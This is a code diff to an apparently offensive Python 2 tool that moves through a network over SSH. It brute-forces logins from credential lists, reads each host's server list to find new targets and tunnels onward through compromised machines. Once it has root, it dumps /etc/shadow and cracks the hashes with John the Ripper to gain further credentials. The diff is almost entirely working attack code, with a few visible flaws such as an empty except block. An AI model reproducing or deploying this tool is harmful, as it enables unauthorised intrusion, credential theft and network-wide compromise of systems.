@@ -115,46 +115,82 @@ def begin_attack(client):
         # gets the next computer in BFS
         server = q.get()
         verbose("Connecting to ssh host %s:%d ..." % (server.host, server.ssh_port))
-        try:
-            if initial_comps > 0:
-                initial_comps -= 1
-                client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS)
-            else:
-                client.connect("localhost", server.local_forward, username=ROOT, password=DEFAULT_PASS)
-                verbose("ssh localhost:%d" % server.local_forward)
 
-        except Exception as e:
-            print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
-            q.put(server)
-            continue
-
-        # at this point we are connected via SSH
-        # gets the servers.txt
-        stdin, stdout, stderr = client.exec_command("cat ~/servers.txt")
-        new_servers = stdout.readlines()
-        # print "%s\n\t%s" % (server.host, new_servers)
-        new_servers = map(lambda x: x.strip(), new_servers)
-        for s in new_servers:
-            host, port = get_host_port(s)
-            # if we have not seen this ip_address before
-            if not (host in ip_list):
-                # create the compObj and add it to be seen in the queue
-                compObj = Computer(host, port)
-                ip_list.append(host)
-                # adds a new port for each tunnelling
-                compObj.local_forward = FORWARD_PORT
-                FORWARD_PORT += 1
-                q.put(compObj)
-
-                # set up forwarder to the new computer
+        user_len = len(USERNAMES)
+        passwd_len = len(PASSWORDS)
+        userN = 0
+        passwd = 0
+        # for each user/pass combination attempt to login
+        # first username in USERNAMES is always 'root'
+        logged_in = False
+        log_root = False
+        while (userN < user_len) and (not logged_in):
+            userCred = USERNAMES[userN]
+            while (passwd < passwd_len) and (not logged_in):
+                passCred = PASSWORDS[passwd]
                 try:
-                    forward_tunnel(compObj.local_forward, compObj.host, compObj.ssh_port, client.get_transport())
-                    verbose('Now forwarding %s:%d to %s:%d ...' % ("localhost", compObj.local_forward, compObj.host, compObj.ssh_port))
+                    if initial_comps > 0:
+                        initial_comps -= 1
+
+                        # attempt to login with current creds
+                        client.connect(server.host, server.ssh_port, username=userCred, password=passCred)
+                    else:
+                        client.connect("localhost", server.local_forward, username=userCred, password=passCred)
+                        verbose("ssh localhost:%d" % server.local_forward)
+                    logged_in = True
+                    # add the user/pass combo to the server object dict of accounts
+                    server.accounts[userCred] = passCred
+                    # if we are logged in as root
+                    if userCred == "root":
+                        log_root = True
+
                 except Exception as e:
-                    print e
+                    # print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
+
+        # if we have logged into the machine
+        if logged_in:
+            # at this point we are connected via SSH
+            # gets the servers.txt
+            stdin, stdout, stderr = client.exec_command("cat ~/servers.txt")
+            new_servers = stdout.readlines()
+            # print "%s\n\t%s" % (server.host, new_servers)
+            new_servers = map(lambda x: x.strip(), new_servers)
+            for s in new_servers:
+                host, port = get_host_port(s)
+                # if we have not seen this ip_address before
+                if not (host in ip_list):
+                    # create the compObj and add it to be seen in the queue
+                    compObj = Computer(host, port)
+                    ip_list.append(host)
+                    # adds a new port for each tunnelling
+                    compObj.local_forward = FORWARD_PORT
+                    FORWARD_PORT += 1
+                    q.put(compObj)
+
+                    # set up forwarder to the new computer
+                    try:
+                        forward_tunnel(compObj.local_forward, compObj.host, compObj.ssh_port, client.get_transport())
+                        verbose('Now forwarding %s:%d to %s:%d ...' % ("localhost", compObj.local_forward, compObj.host, compObj.ssh_port))
+                    except Exception as e:
+                        print e
+
+            # if we are logged in as root
+            if log_root:
+                stdin, stdout, stderr = client.exec_command("cat /etc/shadow")
+                accts = user_hashes(stdout)
+                user_passes = crack_with_john(accts)
+                
+                # for each user/pass combo
+                for cred in user_passes:
+                    # add the creds to the dict of accounts
+                    server.accounts[cred[0]] = cred[1]
+
+        # otherwise, we could not login and need to keep searching for creds
+        else:
+            # put current computer back in the queue
+            q.put(server)
 
     print "QUEUE EMPTY"
-
 
 # shadow_file = file ptr
 def user_hashes(shadow_file):
@@ -171,6 +207,7 @@ def user_hashes(shadow_file):
 
 # cracks a list of hashes with John the Ripper and stores any new usernames and
 # passwords in the global list of users/passwords
+# returns a list of tuples of user/pass combos
 def crack_with_john(hashes_lst):
     global USERNAMES, PASSWORDS
     f = open("curr_hashes.txt", "w")
@@ -189,6 +226,10 @@ def crack_with_john(hashes_lst):
     # split it into array
     hashes = hashes.split('\n')
     # for some reason subprocess.Popen adds a new line at the end of output
+
+    # list of (user,pass) combos
+    combos = []
+
     hashes = hashes[:-1]
     # for each hash it finds
     for h in hashes:
@@ -198,11 +239,14 @@ def crack_with_john(hashes_lst):
         # add the username to the summary list
         if not (user in USERNAMES):
             USERNAMES.append(user)
-            print "Adding %s to Username list" % user
+            print "Adding \"%s\" to Username list" % user
         # add the password to the summary list
         if not (passwd in PASSWORDS):
             PASSWORDS.append(passwd)
-            print "Adding %s to Password list" % passwd
+            print "Adding \"%s\" to Password list" % passwd
+        combos.append((user, passwd))
+
+    return combos
     
 
 if __name__ == "__main__":
@@ -222,14 +266,11 @@ if __name__ == "__main__":
     accts = user_hashes(f)
     f.close()
 
-    print accts
     # output user hashes to a file so john can crack it
     crack_with_john(accts)
 
-    print USERNAMES
-    print PASSWORDS
-
-    sys.exit(1)
+    # print USERNAMES
+    # print PASSWORDS
 
     # initialize the queue with starting computer list
     for c in computers:
